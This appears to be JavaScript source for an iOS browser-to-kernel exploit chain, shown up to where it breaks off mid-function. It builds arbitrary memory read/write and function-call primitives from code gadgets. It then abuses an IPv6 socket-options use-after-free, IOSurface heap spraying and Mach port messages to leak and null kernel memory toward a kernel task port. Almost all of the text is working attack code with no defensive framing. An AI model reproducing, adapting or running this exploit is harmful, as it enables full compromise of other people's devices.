function pr32(x) {
    return ("0000000" + (x >>> 0).toString(16)).substr(-8);
}

function Uint64(lo, hi) {
    this.lo = lo >>> 0;
    this.hi = hi >>> 0;

    this.toString = function(radix) {
        radix = 16;
        return pr32(this.hi) + pr32(this.lo);
    }

    this.add32 = function(n) {
        var rlo = (this.lo + (n >>> 0)) >>> 0;
        var rhi = this.hi;
        if (rlo < this.lo) {
            rhi++;
        }
        return new Uint64(rlo, rhi);
    }

    this.add32inplace = function(n) {
        var rlo = (this.lo + (n >>> 0)) >>> 0;
        var rhi = this.hi;
        if (rlo < this.lo) {
            rhi++;
        }
        this.lo = rlo;
        this.hi = rhi;
    }

    this.sub32 = function(n) {
        var rlo = (this.lo - (n >>> 0)) >>> 0;
        var rhi = this.hi;
        if (rlo > this.lo) {
            rhi--;
        }
        return new Uint64(rlo, rhi);
    }

    this.sub32inplace = function(n) {
        var rlo = (this.lo - (n >>> 0)) >>> 0;
        var rhi = this.hi;
        if (rlo > this.lo) {
            rhi--;
        }
        this.lo = rlo;
        this.hi = rhi;
    }

    this.and32 = function(n) {
        var rlo = this.lo & (n >>> 0);
        return new Uint64(rlo, this.hi);
    }

    return this;
}

// throwback to 2017 @qwertyoruiopz
function leakval(jsvalue) {
    ayyy[0] = jsvalue;
    var rv = new Uint64(lmao[0], lmao[1]);
    ayyy[0] = 1337;
    return rv;
}

/* normally the ayyy <-> lmao aliasing should be enough for any decent exploiter, but we take the easy way out:

magic[0] = cache
magic[2] = dlsym
magic[4] = rfunc
magic[6] = wfunc
magic[8] = call5

qargs[0] -> qargs
x0: qargs[12]
fp: qargs[14]
w1: qargs[16]
x2: qargs[18]
x3: qargs[20]
rv: qargs[22]
*/

var qargs_addr;
try {
    qargs_addr = new Uint64(qargs[0], qargs[1]);
} catch (e) {
    throw '!gadget';
}

// set up read/write and function call

var cache_addr = new Uint64(magic[0], magic[1]);
var dlsym_addr = new Uint64(magic[2], magic[3]);
var rfunc_addr = new Uint64(magic[4], magic[5]);
var wfunc_addr = new Uint64(magic[6], magic[7]);
var call5_addr = new Uint64(magic[8], magic[9]);

function read8(addr) {
    // f9400000 ldr x0, [x0]
    // d65f03c0 ret
    qargs[12] = addr.lo;
    qargs[13] = addr.hi;
    qargs[14] = rfunc_addr.lo;
    qargs[15] = rfunc_addr.hi;
    qcall(qbase, qctrl, qargs);
    return new Uint64(qargs[22], qargs[23]);
}

function write8(addr, value) {
    // f9000002 str x2, [x0]
    // d65f03c0 ret
    if (value instanceof Uint64) {
        qargs[18] = value.lo;
        qargs[19] = value.hi;
    } else if (value != undefined) {
        qargs[18] = value;
        qargs[19] = 0;
    }
    qargs[12] = addr.lo;
    qargs[13] = addr.hi;
    qargs[14] = wfunc_addr.lo;
    qargs[15] = wfunc_addr.hi;
    qcall(qbase, qctrl, qargs);
}

function fcall5(fp, x0, x1, x2, x3, x4) {
    // a9402005 ldp x5, x8, [x0]
    // a9410c01 ldp x1, x3, [x0, #0x10]
    // a9421002 ldp x2, x4, [x0, #0x20]
    // aa0803e0 mov x0, x8
    // d61f00a0 br x5
    var args = qargs_addr.add32(0x100);
    function setarg(offset, value) {
        offset = (offset + 0x100) / 4;
        if (value instanceof Uint64) {
            qargs[offset + 0] = value.lo;
            qargs[offset + 1] = value.hi;
        } else if (value != undefined) {
            qargs[offset + 0] = value;
            qargs[offset + 1] = 0;
        }
    }
    setarg(0x00, fp);
    setarg(0x08, x0);
    setarg(0x10, x1);
    setarg(0x18, x3);
    setarg(0x20, x2);
    setarg(0x28, x4);
    qargs[12] = args.lo;
    qargs[13] = args.hi;
    qargs[14] = call5_addr.lo;
    qargs[15] = call5_addr.hi;
    qcall(qbase, qctrl, qargs);
    return new Uint64(qargs[22], qargs[23]);
}

// set up the symbol resolver

function sptr(string) {
    return read8(read8(leakval(string).add32(0x10)).add32(0x08));
}

var RTLD_DEFAULT = new Uint64(-2, -1);
function dlsym(symname) {
    return fcall5(dlsym_addr, RTLD_DEFAULT, sptr(symname));
}

// set up a more complex function call

//	0xa9420408	ldp x8, x1, [x0, #0x20]
//	0xa9430c02	ldp x2, x3, [x0, #0x30]
//	0xa9441404	ldp x4, x5, [x0, #0x40]
//	0xf9402806	ldr x6, [x0, #0x50]
//	0xf9400907	ldr x7, [x8, #0x10]
//	0xaa0803e0	mov x0, x8
//	0xd61f00e0	br x7
var gadget_load_6 = new Uint64(magic[10], magic[11]);
//	0xa940a408	ldp x8, x9, [x0, #8]
//	0xaa0803e0	mov x0, x8
//	0xd61f0120	br x9
var gadget_set_x8 = new Uint64(magic[12], magic[13]);
//	0xd10083ff	sub sp, sp, #0x20
//	0xa9017bfd	stp x29, x30, [sp, #0x10]
//	0x910043fd	add x29, sp, #0x10
//	0xa9000fe2	stp x2, x3, [sp]
//	0xf9400c00	ldr x0, [x0, #0x18]
//	0xb4000100	cbz x0, #0x1957d65ec
//	0xf9400008	ldr x8, [x0]
//	0xf9401908	ldr x8, [x8, #0x30]
//	0x910003e2	mov x2, sp
//	0xd63f0100	blr x8
//	0xa9417bfd	ldp x29, x30, [sp, #0x10]
//	0x910083ff	add sp, sp, #0x20
//	0xd65f03c0	ret
var gadget_call2v = new Uint64(magic[14], magic[15]);
//	0xf9406508	ldr x8, [x8, #0xc8]	// iOS12 has 0xd0: f9406908
//	0xd2800007	movz x7, #0
//	0xd61f0100	br x8
var gadget_set_x7 = new Uint64(magic[16], magic[17]);

var gadget_set_x7_insn = read8(gadget_set_x7).lo;
var gadget_set_x7_offs = ((gadget_set_x7_insn >>> 10) & 0xFFF) << (gadget_set_x7_insn >>> 30);

function fcallv(fp, x0, x1, a0, a1) {
    var args = qargs_addr.add32(0x200);

    function setarg(offset, value) {
        offset = offset / 4;
        if (value instanceof Uint64) {
            qargs[offset + 0] = value.lo;
            qargs[offset + 1] = value.hi;
        } else if (value != undefined) {
            qargs[offset + 0] = value;
            qargs[offset + 1] = 0;
        }
    }

    setarg(0x208, x0);
    setarg(0x210, fp);

    setarg(0x218, args);
    setarg(0x200, args);
    setarg(0x230, gadget_set_x8);

    return fcall5(gadget_call2v, args, x1, a0, a1);
}

function fcall(fp, x0, x1, x2, x3, x4, x5, x6, x7, a0, a1) {
    if (x7 != undefined && x7 != 0) {
        throw 'x7 must be 0';
    }

    function setarg(offset, value) {
        offset = offset / 4;
        if (value instanceof Uint64) {
            qargs[offset + 0] = value.lo;
            qargs[offset + 1] = value.hi;
        } else if (value != undefined) {
            qargs[offset + 0] = value;
            qargs[offset + 1] = 0;
        }
    }

    setarg(0x508, x0);
    setarg(0x510, fp);
    setarg(0x500 + gadget_set_x7_offs, gadget_set_x8);

    setarg(0x408, qargs_addr.add32(0x500));
    setarg(0x410, gadget_set_x7);

    setarg(0x320, qargs_addr.add32(0x300));
    setarg(0x328, x1);
    setarg(0x330, x2);
    setarg(0x338, x3);
    setarg(0x340, x4);
    setarg(0x348, x5);
    setarg(0x350, x6);
    setarg(0x310, gadget_set_x8);
    setarg(0x308, qargs_addr.add32(0x400));

    return fcallv(gadget_load_6, qargs_addr.add32(0x300), 0, a0, a1);
}

// I can haz JimBeam?

fcall(dlsym("puts\x00"), sptr("OHAI\x00"));

function leakvec(arr) {
    var vec = leakval(arr);
    var len = read8(vec.add32(0x18));
    if (len.lo != arr.length) {
        return len;
    }
    return read8(vec.add32(0x10));
}

var poison = leakvec(qargs);
poison.lo ^= qargs_addr.lo;
poison.hi ^= qargs_addr.hi;

function leakvec32(arr) {
    var addr = leakvec(arr);
    addr.lo ^= poison.lo;
    addr.hi ^= poison.hi;
    return addr;
}

function read4(addr) {
    return read8(addr).lo;
}

function write4(addr, value) {
    var val = read8(addr);
    val.lo = value;
    write8(addr, val);
}

//////////////////////////////////////////////////////////////////////////////

const kOSSerializeBinarySignature = 0xd3;
const kOSSerializeDictionary    = 0x01000000;
const kOSSerializeArray         = 0x02000000;
const kOSSerializeSet           = 0x03000000;
const kOSSerializeNumber        = 0x04000000;
const kOSSerializeSymbol        = 0x08000000;
const kOSSerializeString        = 0x09000000;
const kOSSerializeData          = 0x0a000000;
const kOSSerializeBoolean       = 0x0b000000;
const kOSSerializeObject        = 0x0c000000;
const kOSSerializeTypeMask      = 0x7F000000;
const kOSSerializeDataMask      = 0x00FFFFFF;
const kOSSerializeEndCollection = 0x80000000;

var IOConnectCallMethod_ptr = dlsym("IOConnectCallMethod\x00");
var IOObjectRelease_ptr = dlsym("IOObjectRelease\x00");
var IOServiceClose_ptr = dlsym("IOServiceClose\x00");
var IOServiceGetMatchingService_ptr = dlsym("IOServiceGetMatchingService\x00");
var IOServiceMatching_ptr = dlsym("IOServiceMatching\x00");
var IOServiceOpen_ptr = dlsym("IOServiceOpen\x00");
var calloc_ptr = dlsym("calloc\x00");
var close_ptr = dlsym("close\x00");
var disconnectx_ptr = dlsym("disconnectx\x00");
var free_ptr = dlsym("free\x00");
var getsockopt_ptr = dlsym("getsockopt\x00");
var mach_host_self_ptr = dlsym("mach_host_self\x00");
var mach_msg_send_ptr = dlsym("mach_msg_send\x00");
var mach_port_allocate_ptr = dlsym("mach_port_allocate\x00");
var mach_port_destroy_ptr = dlsym("mach_port_destroy\x00");
var mach_port_insert_right_ptr = dlsym("mach_port_insert_right\x00");
var mach_port_set_attributes_ptr = dlsym("mach_port_set_attributes\x00");
var mach_task_self_ = read4(dlsym("mach_task_self_\x00"));
var mach_vm_allocate_ptr = dlsym("mach_vm_allocate\x00");
var mach_vm_read_overwrite_ptr = dlsym("mach_vm_read_overwrite\x00");
var mach_vm_write_ptr = dlsym("mach_vm_write\x00");
var malloc_ptr = dlsym("malloc\x00");
var memcpy_ptr = dlsym("memcpy\x00");
var memset_ptr = dlsym("memset\x00");
var pid_for_task_ptr = dlsym("pid_for_task\x00");
var pipe_ptr = dlsym("pipe\x00");
var pthread_yield_np_ptr = dlsym("pthread_yield_np\x00");
var read_ptr = dlsym("read\x00");
var setsockopt_ptr = dlsym("setsockopt\x00");
var socket_ptr = dlsym("socket\x00");
var uname_ptr = dlsym("uname\x00");
var usleep_ptr = dlsym("usleep\x00");
var write_ptr = dlsym("write\x00");

function assert(condition, text) {
    if (condition) {
        return;
    }
    throw text;
}

var scratch_array = new Uint32Array(2048);
var scratch = leakvec32(scratch_array);

//////////////////////////////////////////////////////////////////////////////

var offsets;
var create_outsize;
var pagesize = 0x4000;

var SMAP = false;

var kstruct_offsets_11 = {
    KSTRUCT_OFFSET_TASK_VM_MAP:             0x20,
    KSTRUCT_OFFSET_TASK_PREV:               0x30,
    KSTRUCT_OFFSET_TASK_ITK_SPACE:          0x308,
    KSTRUCT_OFFSET_TASK_BSD_INFO:           0x368,

    KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER:    0x60,
    KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT:     0x68,

    KSTRUCT_OFFSET_PROC_PID:                0x10,
    KSTRUCT_OFFSET_PROC_P_FD:               0x108,

    KSTRUCT_OFFSET_FILEPROC_F_FGLOB:        0x8,

    KSTRUCT_OFFSET_FILEGLOB_FG_DATA:        0x38,

    KSTRUCT_OFFSET_PIPE_BUFFER:             0x10,

    KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE: 0x14,
    KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE:      0x20,
};

function offsets_init() {
    fcall(uname_ptr, scratch.add32(0x100));

    let rele = scratch_array[(0x100 + 0x200) / 4];
    if (rele == 0x302e3731) { // 11.0.x
        create_outsize = 0xbc8; // 0x6c8;
        offsets = kstruct_offsets_11;
    } else if (rele == 0x322e3731 || rele == 0x332e3731 || rele == 0x342e3731) { // 11.1.x - 11.2.6
        create_outsize = 0xbc8;
        offsets = kstruct_offsets_11;
    } else {
        create_outsize = 0xbc8;
        offsets = kstruct_offsets_11;
    }

    if (scratch_array[(0x100 + 0x400) / 4] == 0x6F685069) { // iPho
        let machine = scratch_array[(0x100 + 0x400) / 4 + 1];
        if ((machine & 0xFF000000) == 0x2c000000) {
            // 6F685069 2C39656E ......31 iPhone9,1
            machine = (machine >>> 16) & 0xFF;
        } else {
            // 6F685069 3031656E ....312C iPhone10,1
            machine = (machine >>> 16) & 0xFFFF;
        }
        // XXX iPhone7,x and below has 4k pages
        if (machine <= 0x37) {
            pagesize = 0x1000;
        }
        if (machine >= 0x39) {
            SMAP = true;
        }
    //} else if (scratch_array[0x500 / 4] == 0x64615069) { // iPad: 64615069 ..332C35 iPad5,3
        // XXX iPad5,x and below has 4k pages, but 5,x is known to report 16k for host_page_size(mach_host_self(), &sz);
    //} else if (scratch_array[0x500 / 4] == 0x646F5069) { // iPod: 646F5069 ..312C37 iPod7,1
        // XXX iPod7,x and below has 4k pages
    //} else if (scratch_array[0x500 / 4] == 0x6C707041) { // Appl: 6C707041 35565465 ....332C AppleTV5,3
        // XXX AppleTV5,x and below has 4k pages
    }
}

// ============== kernel_memory ========================

var tfpzero;

function kalloc(size) {
    scratch_array[0] = 0;
    scratch_array[1] = 0;
    fcall(mach_vm_allocate_ptr, tfpzero, scratch, size, 1); // VM_FLAGS_ANYWHERE
    return new Uint64(scratch_array[0], scratch_array[1]);
}

function kread(where, p, size) {
    let offset = 0;
    while (offset < size) {
        let chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        let rv = fcall(mach_vm_read_overwrite_ptr, tfpzero, where.add32(offset), chunk, p.add32(offset), scratch);
        if (rv.lo || scratch_array[0] == 0) {
            throw 'kread';
        }
        offset += scratch_array[0];
    }
    return offset;
}

function kwrite(where, p, size) {
    let offset = 0;
    while (offset < size) {
        let chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        let rv = fcall(mach_vm_write_ptr, tfpzero, where.add32(offset), p.add32(offset), chunk);
        if (rv.lo) {
            throw 'kwrite';
        }
        offset += chunk;
    }
    return offset;
}

function find_port(port, task_self) {
    let task_addr = rk64(task_self.add32(offsets.KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    let itk_space = rk64(task_addr.add32(offsets.KSTRUCT_OFFSET_TASK_ITK_SPACE));
    let is_table = rk64(itk_space.add32(offsets.KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

    let port_index = port >> 8;
    const sizeof_ipc_entry_t = 0x18;

    return rk64(is_table.add32(port_index * sizeof_ipc_entry_t));
}

// ============== iosurface ============================

var IOSurfaceRoot;
var IOSurfaceRootUserClient;
var IOSurface_id = 0;

function IOSurface_init() {
    IOSurfaceRoot = fcall(IOServiceGetMatchingService_ptr, read8(dlsym("kIOMasterPortDefault\x00")), fcall(IOServiceMatching_ptr, sptr("IOSurfaceRoot\x00")));
    if (IOSurfaceRoot.lo == 0) {
        throw 'IOSurfaceRoot';
    }
    let kr = fcall(IOServiceOpen_ptr, IOSurfaceRoot, mach_task_self_, 0, scratch);
    if (kr.lo) {
        throw 'IOServiceOpen';
    }
    IOSurfaceRootUserClient = new Uint64(scratch_array[0], scratch_array[1]);

    let create_args = scratch.add32(0x10);
    scratch_array[0x10 / 4 + 7] = 0x4000; // .alloc_size = 0x4000

    let lock_result = scratch.add32(1024 * 4);

    let lock_result_size = scratch.add32(0x30);
    scratch_array[0x30 / 4] = create_outsize;

    kr = fcall(IOConnectCallMethod_ptr,
                IOSurfaceRootUserClient,
                6, // create_surface_client_fast_path
                0, 0,
                create_args, 0x20, // sizeof(create_args)
                0, 0,
                lock_result, lock_result_size);
    if (kr.lo) {
        throw 'IOConnectCallMethod';
    }
    IOSurface_id = scratch_array[1024 + 6];
    if (!IOSurface_id) {
        IOSurface_id = scratch_array[1024 + 4];
    }
}

function IOSurface_deinit() {
    if (IOSurface_id) {
        IOSurface_id = 0;
        fcall(IOServiceClose_ptr, IOSurfaceRootUserClient);
        fcall(IOObjectRelease_ptr, IOSurfaceRoot);
    }
}

// A wrapper around IOSurfaceRootUserClient::set_value().
function IOSurface_set_value(args, args_size) {
    scratch_array[0] = 4;
    scratch_array[1] = 0;
    let kr = fcall(IOConnectCallMethod_ptr,
                    IOSurfaceRootUserClient,
                    9, // set_value
                    0, 0,
                    args, args_size,
                    0, 0,
                    scratch.add32(8), scratch);
    if (kr.lo) {
        return false;
    }
    return true;
}

// Encode an integer so that it does not contain any null bytes.
function base255_encode(value) {
    let encoded = 0;
    for (let i = 0; i < 4; i++) {
        encoded |= (value % 255 + 1) << (8 * i);
        value = (value / 255) >> 0;
    }
    return encoded;
}

function xml_units_for_data_size(data_size) {
    return ((data_size - 1) + (4 - 1)) >> 2;
}

// Create the template of the serialized array to pass to IOSurfaceUserClient::set_value().
// Returns the size of the serialized data in units.
function serialize_IOSurface_data_array(xml, array_length, data_size, xml_data) {
    let x = 2;
    xml[x++] = kOSSerializeBinarySignature;
    xml[x++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    xml[x++] = kOSSerializeArray | array_length;
    for (let i = 0; i < array_length; i++) {
        let flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
        xml[x++] = kOSSerializeData | (data_size - 1) | flags;
        xml_data[i] = x;
        x += xml_units_for_data_size(data_size);
    }
    xml[x++] = kOSSerializeSymbol | (4 + 1) | kOSSerializeEndCollection;
    let key = x++;      // This will be filled in on each array loop.
    xml[x++] = 0;       // Null-terminate the symbol.
    return key;
}

var total_arrays = 0;

// A generalized version of IOSurface_spray_with_gc() and IOSurface_spray_size_with_gc().
function IOSurface_spray_with_gc_internal(array_count, array_length, extra_count, data, data_size, callback) {
    assert(array_count <= 0xffffff && array_length <= 0xffff && data_size <= 0xffffff && extra_count < array_count, 'params');
    if (!IOSurface_id) {
        throw 'IOSurface_id';
    }
    // How big will our OSUnserializeBinary dictionary be?
    let current_array_length = array_length + (extra_count > 0 ? 1 : 0);
    let xml_units_per_data = xml_units_for_data_size(data_size);
    let xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
    // Allocate the args struct.
    let args = new Uint32Array(2 + xml_units);
    let args_vec = leakvec32(args);
    // Build the IOSurfaceValueArgs.
    args[0] = IOSurface_id;
    // Create the serialized OSArray. We'll remember the locations we need to fill in with our
    // data as well as the slot we need to set our key.
    let xml_data = new Uint32Array(current_array_length);
    let key = serialize_IOSurface_data_array(args, current_array_length, data_size, xml_data);
    assert(key == xml_units, 'key');
    // Keep track of when we need to do GC.
    let sprayed = 0;
    let next_gc_step = 0;
    // Loop through the arrays.
    for (let array_id = 0; array_id < array_count; array_id++) {
        // If we've crossed the GC sleep boundary, sleep for a bit and schedule the
        // next one.
        // Now build the array and its elements.
        args[key] = base255_encode(total_arrays + array_id);
        for (let data_id = 0; data_id < current_array_length; data_id++) {
            // Update the data for this spray if the user requested.
            if (callback) {
                callback(array_id, data_id, data, data_size);
            }
            // Copy in the data to the appropriate slot.
            fcall(memcpy_ptr, args_vec.add32(xml_data[data_id] * 4), data, data_size - 1);
        }
        // Finally set the array in the surface.
        ok = IOSurface_set_value(args_vec, args.length * 4);
        if (!ok) {
            args = null;
            xml_data = null;
            return false;
        }
        if (ok) {
            sprayed += data_size * current_array_length;
            // If we just sprayed an array with an extra element, decrement the
            // outstanding extra_count.
            if (current_array_length > array_length) {
                assert(extra_count > 0, 'extra_count');
                extra_count--;
                // If our extra_count is now 0, rebuild our serialized array. (We
                // could implement this as a memmove(), but I'm lazy.)
                if (extra_count == 0) {
                    current_array_length--;
                    key = serialize_IOSurface_data_array(args, current_array_length, data_size, xml_data);
                }
            }
        }
    }
    if (next_gc_step > 0) {
    }
    // Clean up resources.
    args = null;
    xml_data = null;
    total_arrays += array_count;
    return true;
}

// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
function fill_kalloc_with_port_pointer(target_port, count, disposition) {
    let kr = fcall(mach_port_allocate_ptr, mach_task_self_, 1, scratch); // MACH_PORT_RIGHT_RECEIVE
    if (kr.lo) {
        throw 'fill_kalloc_with_port_pointer 1';
    }
    let q = scratch_array[0];

    let ports = new Uint32Array(count);
    let ports_addr = leakvec32(ports);
    for (let i = 0; i < count; i++) {
        ports[i] = target_port;
    }

    const message_size = 44;                    // sizeof(struct ool_msg));
    let msg = new Uint32Array(message_size / 4);
    let msg_header = leakvec32(msg);

    msg[0] = 0x80000014;                        // msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg[1] = message_size;                      // msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg[2] = q;                                 // msg->hdr.msgh_remote_port = q;
    msg[3] = 0;                                 // msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg[5] = 0x41414141;                        // msg->hdr.msgh_id = 0x41414141;

    msg[6] = 1;                                 // msg->body.msgh_descriptor_count = 1;

    msg[7] = ports_addr.lo;                     // msg->ool_ports.address = ports;
    msg[8] = ports_addr.hi;                     // msg->ool_ports.address = ports;
    msg[10] = count;                            // msg->ool_ports.count = count;
    msg[9] = 0x2000000 | (disposition << 16);   // msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR, deallocate = FALSE, copy = MACH_MSG_PHYSICAL_COPY, disposition = disposition

    kr = fcall(mach_msg_send_ptr, msg_header);
    if (kr.lo) {
        throw 'fill_kalloc_with_port_pointer 2';
    }

    msg = null;
    ports = null;
    return q;
}

// ============== exploit_utilities ====================

function message_size_for_kalloc_size(kalloc_size) {
    return ((3 * kalloc_size) >> 2) - 0x74;
}

// Ian Beer
function send_kalloc_message(replacer_message_body, replacer_body_size) {
    let err = fcall(mach_port_allocate_ptr, mach_task_self_, 1, scratch); // MACH_PORT_RIGHT_RECEIVE
    if (err.lo) {
        throw 'send_kalloc_message 1';
    }
    let q = scratch_array[0];

    scratch_array[0] = 1024; // mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_LARGE };
    err = fcall(mach_port_set_attributes_ptr, mach_task_self_,
                q,
                1, // MACH_PORT_LIMITS_INFO
                scratch,
                1); // MACH_PORT_LIMITS_INFO_COUNT
    if (err.lo) {
        throw 'send_kalloc_message 2';
    }

    let msg_size = 24 + replacer_body_size;
    let msg = new Uint32Array(msg_size / 4);
    let msg_header = leakvec32(msg);
    fcall(memcpy_ptr, msg_header.add32(24), replacer_message_body, replacer_body_size);

    for (let i = 0; i < 256; i++) {
        msg[0] = 20;         // msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg[1] = msg_size;   // msg->hdr.msgh_size = msg_size;
        msg[2] = q;          // msg->hdr.msgh_remote_port = q;
        msg[3] = 0;          // msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg[5] = 0x41414142; // msg->hdr.msgh_id = 0x41414142;

        err = fcall(mach_msg_send_ptr, msg_header);
        if (err.lo) {
            throw 'send_kalloc_message 3';
        }
    }

    msg = null;
    return q;
}

// ============== exploit ==============================

function getminmtu(sock) {
    scratch_array[0] = 4;
    scratch_array[1] = 0;
    fcall(getsockopt_ptr, sock, 41, 42, scratch.add32(4), scratch); // getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
    return scratch_array[1];
}

// return a socket ready for UAF
function get_socket_with_dangling_options() {
    let sock = fcall(socket_ptr, 30, 1, 6); // socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock.lo & 0x80000000) {
        throw 'get_socket_with_dangling_options 1';
    }

    // allow setsockopt() after disconnect()
    // struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    scratch_array[0] = 1;
    scratch_array[1] = 1;
    let kr = fcall(setsockopt_ptr, sock, 0xFFFF, 0x1083, scratch, 8); // setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (kr.lo) {
        throw 'get_socket_with_dangling_options 2';
    }

    scratch_array[0] = -1; // minmtu
    fcall(setsockopt_ptr, sock, 41, 42, scratch, 4); // setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));

    fcall(disconnectx_ptr, sock, 0, 0);

    return sock.lo;
}

function new_port() {
    let rv = fcall(mach_port_allocate_ptr, mach_task_self_, 1, scratch); // MACH_PORT_RIGHT_RECEIVE
    if (rv.lo) {
        throw 'new_port 1';
    }
    let port = scratch_array[0];
    rv = fcall(mach_port_insert_right_ptr, mach_task_self_, port, port, 20); // MACH_MSG_TYPE_MAKE_SEND
    if (rv.lo) {
        throw 'new_port 2';
    }
    return port;
}

// first primitive: leak the kernel address of a mach port
function find_port_via_uaf(port) {
    // here we use the uaf as an info leak
    let sock = get_socket_with_dangling_options();

    var ptr;
    for (let i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        let p = fill_kalloc_with_port_pointer(port, 192 / 8, 19); // MACH_MSG_TYPE_COPY_SEND

        // this is like doing rk32(options + 180);
        let mtu = getminmtu(sock);
        // this like rk32(options + 184);
        scratch_array[0] = 4;
        scratch_array[1] = 0;
        fcall(getsockopt_ptr, sock, 41, 63, scratch.add32(4), scratch); // getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
        let pref = scratch_array[1];

        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)

        /*  from a hex dump:

         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */

        fcall(mach_port_destroy_ptr, mach_task_self_, p);

        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            ptr = new Uint64(pref, mtu);
            break;
        }
    }

    // close that socket.
    fcall(close_ptr, sock);
    return ptr;
}

var cookie = 0x41424344;

function read_20_via_uaf(addr) {
    let sockets = new Uint32Array(128);
    for (let i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }

    // create a fake struct with our dangling port address as its pktinfo
    let fake_opts = new Uint32Array(48); // struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    let fake_opts_vector = leakvec32(fake_opts);
    fake_opts[45] = cookie; // ->ip6po_minmtu // give a number we can recognize
    fake_opts[41] = cookie; // ->ip6po_minmtu // on iOS 10, offset is different
    fake_opts[4] = addr.lo; // ->ip6po_pktinfo
    fake_opts[5] = addr.hi;

    let found_at = -1;

    for (let i = 0; i < 20 && found_at < 0; i++) { // iterate through the sockets to find if we overwrote one
        IOSurface_spray_with_gc_internal(32, 256, 0, fake_opts_vector, fake_opts.length * 4);

        for (let j = 0; j < 128; j++) {
            let minmtu = getminmtu(sockets[j]);
            if (minmtu == cookie) { // found it!
                found_at = j; // save its index
                break;
            }
        }
    }

    fake_opts = null;

    for (let i = 0; i < 128; i++) {
        if (i != found_at) {
            fcall(close_ptr, sockets[i]);
        }
    }

    if (found_at < 0) {
        sockets = null;
        return null;
    }
    cookie++;

    scratch_array[0] = 20; // sizeof(struct in6_pktinfo)
    scratch_array[1] = 0;
    scratch_array[2] = 0;
    fcall(getsockopt_ptr, sockets[found_at], 41, 46, scratch.add32(4), scratch); // getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
    fcall(close_ptr, sockets[found_at]);

    sockets = null;
    if ((scratch_array[1] | scratch_array[2]) == 0) {
        return null;
    }
    return new Uint64(scratch_array[1], scratch_array[2]);
}

function null_20_via_uaf(addr) {
    // create a bunch of sockets
    let sockets = new Uint32Array(128);
    for (let i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }

    // create a fake struct with our dangling port address as its pktinfo
    let fake_opts = new Uint32Array(48); // struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    let fake_opts_vector = leakvec32(fake_opts);
    fake_opts[45] = cookie; // ->ip6po_minmtu // give a number we can recognize
    fake_opts[41] = cookie; // ->ip6po_minmtu // on iOS 10, offset is different
    fake_opts[4] = addr.lo; // ->ip6po_pktinfo
    fake_opts[5] = addr.hi;

    let found_at = -1;

    for (let i = 0; i < 20 && found_at < 0; i++) { // iterate through the sockets to find if we overwrote one
        IOSurface_spray_with_gc_internal(32, 256, 0, fake_opts_vector, fake_opts.length * 4);

        for (let j = 0; j < 128; j++) {
            let minmtu = getminmtu(sockets[j]);
            if (minmtu == cookie) { // found it!
                found_at = j; // save its index
                break;
            }
        }
    }

    fake_opts = null;

    for (let i = 0; i < 128; i++) {
        if (i != found_at) {
            fcall(close_ptr, sockets[i]);
        }
    }

    if (found_at < 0) {
        throw 'null_20_via_uaf';
    }

    scratch_array[0] = 0;
    scratch_array[1] = 0;
    scratch_array[2] = 0;
    scratch_array[3] = 0;
    scratch_array[4] = 1; // buf->ipi6_ifindex = 1;

    let ret = fcall(setsockopt_ptr, sockets[found_at], 41, 46, scratch, 20);
    fcall(close_ptr, sockets[found_at]);
    sockets = null;
    return ret.lo;
}

function mach_port_waitq_flags() {
    return 0x66;
}

function rk64_check(addr) {
    let r = read_20_via_uaf(addr);
    if (r == null) {
        fcall(usleep_ptr, 100);
        r = read_20_via_uaf(addr);
        if (r == null) {
            throw 'rk64_check';
        }
    }
    return r;
}

// ============== main =================================

offsets_init();

// -------------- INITIALIZE IOSURFACE -----------------

IOSurface_init();

// -------------- CHECK FOR SMAP -----------------------

var pipefdr, pipefdw;
if (SMAP) {
    let kr = fcall(pipe_ptr, scratch);
    if (kr.lo) {
        throw 'pipes';
    }
    pipefdr = scratch_array[0];
    pipefdw = scratch_array[1];

